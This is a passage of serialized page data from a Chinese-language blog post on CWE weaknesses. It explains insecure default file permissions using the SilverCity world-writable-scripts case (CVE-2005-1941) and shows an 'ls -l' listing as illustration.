1"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"软件在安装或初始化时，通常会创建一些文件、目录或资源。这些资源会被分配默认的权限（读、写、执行权限等）。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"如果这些默认权限设置得过于宽松，比如允许所有用户都具有读写权限，那么未授权的用户可能会访问、修改或删除这些文件，导致数据泄露、篡改或破坏。"}}],["$","div",null,{"className":"x-highlightblock highlight-background-blue","children":[["$","h4",null,{"className":"x-h3","children":"Example in real-world project"}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"OpenCVE：<a href=\"https://www.opencve.io/cve/CVE-2005-1941\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">CVE-2005-1941</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<code class=\"x-inline-highlight\">Exploit</code>：<a href=\"https://bugs.gentoo.org/93558\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">https://bugs.gentoo.org/93558</a>"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"0.9.5-r1版本之前的SilverCity安装了<code class=\"x-inline-highlight\">cgi-styler-form.py</code>、<code class=\"x-inline-highlight\">cgistyler.py</code>和<code class=\"x-inline-highlight\">source2html.py</code>，具有<code class=\"x-inline-highlight\">world writable</code>权限。"}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"# ls -l /usr/bin/*.py\n-rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py\n-rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py\n-rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"# ls -l /usr/bin/*.py\n-rwxrwxrwx  1 root root 4443 May 22 16:58 /usr/bin/cgi-styler-form.py\n-rwxrwxrwx  1 root root 2990 May 22 16:58 /usr/bin/cgi-styler.py\n-rwxrwxrwx  1 root root 3776 May 22 16:58 /usr/bin/source2html.py\n"}}]}]]}]]}]]
c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Learn CWEs & Real-word Examples - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/24b/learn-cwes/"}]]
1:null
